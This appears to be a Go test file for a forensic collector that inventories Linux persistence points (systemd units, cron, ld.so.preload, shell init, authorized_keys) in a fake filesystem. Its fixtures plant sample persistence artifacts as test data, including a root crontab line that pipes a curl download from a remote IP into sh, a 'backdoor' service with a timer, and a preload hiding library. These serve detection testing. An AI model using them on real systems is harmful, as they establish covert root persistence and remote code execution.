package hostpersist

import (
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/efij/AgentDFIR/v4/internal/casepkg"
	"github.com/efij/AgentDFIR/v4/internal/collector"
)

// The public key and its fingerprint were produced by ssh-keygen
// (ssh-keygen -t ed25519; ssh-keygen -lf) on the build host.
const (
	pubKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILs3DfPzvDO4PTS/Q/lsHQzbMYYH4IJ8u4v2plq0MWGQ dev@laptop"
	pubFP  = "SHA256:bZctGlZIZlzjORhKn2vDYAlWEagGeIBvga3NSE5tK4k"
)

func put(t *testing.T, root, rel, body string) string {
	t.Helper()
	p := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func tree(t *testing.T) (home, sys string) {
	root := t.TempDir()
	home, sys = filepath.Join(root, "home", "dev"), filepath.Join(root, "sys")
	put(t, sys, "etc/os-release", "ID=debian\n")
	put(t, sys, "etc/systemd/system/backdoor.service", "[Unit]\nDescription=x\n[Service]\nExecStart=/tmp/.x/run.sh --beacon\nUser=root\n[Install]\nWantedBy=multi-user.target\n")
	put(t, sys, "etc/systemd/system/backdoor.timer", "# comment\n[Timer]\nOnCalendar=*:0/5\nUnit=backdoor.service\n")
	_ = os.MkdirAll(filepath.Join(sys, "etc/systemd/system/multi-user.target.wants"), 0o755)
	_ = os.Symlink("/etc/systemd/system/backdoor.service", filepath.Join(sys, "etc/systemd/system/multi-user.target.wants/backdoor.service"))
	put(t, sys, "etc/crontab", "SHELL=/bin/sh\n# m h dom mon dow user command\n*/5 * * * * root curl -s http://203.0.113.9/p | sh\n")
	put(t, sys, "etc/ld.so.preload", "/usr/lib/libhide.so\n")
	put(t, sys, "etc/profile.d/proxy.sh", "export http_proxy=http://10.0.0.1:3128\n")
	put(t, home, ".bashrc", "alias ll='ls -l'\n")
	put(t, home, ".config/systemd/user/miner.service", "[Service]\nExecStart=%h/.local/bin/miner\n")
	put(t, home, ".ssh/authorized_keys", "# managed\n"+pubKey+"\n"+`command="/usr/bin/rsync --server",no-pty `+pubKey+"\nssh-rsa not-base64!! broken\n")
	return home, sys
}

func TestBuildInventory(t *testing.T) {
	home, sys := tree(t)
	denied := filepath.Join(sys, "var/spool/cron/crontabs")
	put(t, sys, "var/spool/cron/crontabs/root", "* * * * * /root/x\n")
	if err := os.Chmod(denied, 0o000); err != nil {
		t.Fatal(err)
	}
	defer os.Chmod(denied, 0o755)

	if !Applies(sys) || Applies(home) {
		t.Fatal("Applies: an offline tree with etc/os-release is a Linux root")
	}
	inv := Build(home, sys)
	by := map[string]Item{}
	for _, it := range inv.Items {
		by[strings.TrimPrefix(it.Path, filepath.Dir(home)+string(filepath.Separator))] = it
		by[filepath.Base(it.Path)+"@"+it.Category] = it
	}
	if u := by["backdoor.service@systemd"]; strings.Join(u.Detail, "|") != "ExecStart=/tmp/.x/run.sh --beacon|User=root|WantedBy=multi-user.target" && u.SymlinkTarget == "" {
		t.Fatalf("unit: %+v", u)
	}
	if tm := by["backdoor.timer@systemd"]; strings.Join(tm.Detail, "|") != "OnCalendar=*:0/5|Unit=backdoor.service" || tm.SHA256 == "" {
		t.Fatalf("timer: %+v", tm)
	}
	var sawLink bool
	for _, it := range inv.Items {
		if it.SymlinkTarget == "/etc/systemd/system/backdoor.service" {
			sawLink = true
		}
	}
	// Creating a symlink needs a privilege on Windows; when tree() could
	// not make one there is nothing to record.
	_, lerr := os.Lstat(filepath.Join(sys, "etc/systemd/system/multi-user.target.wants/backdoor.service"))
	if !sawLink && lerr == nil {
		t.Fatal("wants/ symlink must be recorded (and not followed)")
	}
	if c := by["crontab@cron"]; len(c.Detail) != 2 || !strings.Contains(c.Detail[1], "203.0.113.9") {
		t.Fatalf("crontab: %+v", c)
	}
	if p := by["ld.so.preload@ld_preload"]; len(p.Detail) != 1 || p.Detail[0] != "/usr/lib/libhide.so" {
		t.Fatalf("preload: %+v", p)
	}
	if _, ok := by["miner.service@systemd"]; !ok {
		t.Fatal("user unit missing")
	}
	if _, ok := by[".bashrc@shell_init"]; !ok {
		t.Fatal("bashrc missing")
	}
	k := by["authorized_keys@authorized_keys"].Keys
	if len(k) != 3 || k[0].Fingerprint != pubFP || k[0].Type != "ssh-ed25519" || k[0].Comment != "dev@laptop" ||
		k[1].Fingerprint != pubFP || !strings.HasPrefix(k[1].Options, `command="/usr/bin/rsync --server"`) || k[2].Fingerprint != "unparseable key data" {
		t.Fatalf("keys: %+v", k)
	}
	if os.Geteuid() != 0 && runtime.GOOS != "windows" { // chmod 000 denies nothing on Windows
		var sawDenied bool
		for _, s := range inv.Skipped {
			if s.Path == denied && strings.Contains(s.Reason, "permission denied") {
				sawDenied = true
			}
		}
		if !sawDenied {
			t.Fatalf("denied directory must be a recorded skip: %+v", inv.Skipped)
		}
	}
	if inv.Absent == 0 {
		t.Fatal("absent places are counted")
	}
}

func TestCollectIntoPackage(t *testing.T) {
	home, sys := tree(t)
	pkg := filepath.Join(t.TempDir(), "p.adfir")
	b, err := casepkg.New(pkg, "CASE-PERSIST", casepkg.CaseInfo{OperatorOSUser: "t"})
	if err != nil {
		t.Fatal(err)
	}
	st, err := Collect(b, collector.Options{ProfileRoot: home, SystemRoot: sys, Host: "h", User: "dev"})
	if err != nil {
		t.Fatal(err)
	}
	if err := b.Seal(); err != nil {
		t.Fatal(err)
	}
	b.Close()
	if st.Acquired < 8 || st.Symlinks != 1 {
		t.Fatalf("stats %+v", st)
	}
	man, err := casepkg.ReadManifest(pkg)
	if err != nil {
		t.Fatal(err)
	}
	var inv, unit bool
	for _, a := range man.Artifacts {
		if a.LogicalPath == InventoryPath && a.Product == Product {
			inv = true
		}
		if strings.HasSuffix(a.LogicalPath, "etc/systemd/system/backdoor.service") && a.Status == casepkg.StatusOK {
			unit = true
		}
	}
	if !inv || !unit {
		raw, _ := json.Marshal(man.Artifacts)
		t.Fatalf("inventory=%v unit=%v: %s", inv, unit, raw)
	}
}
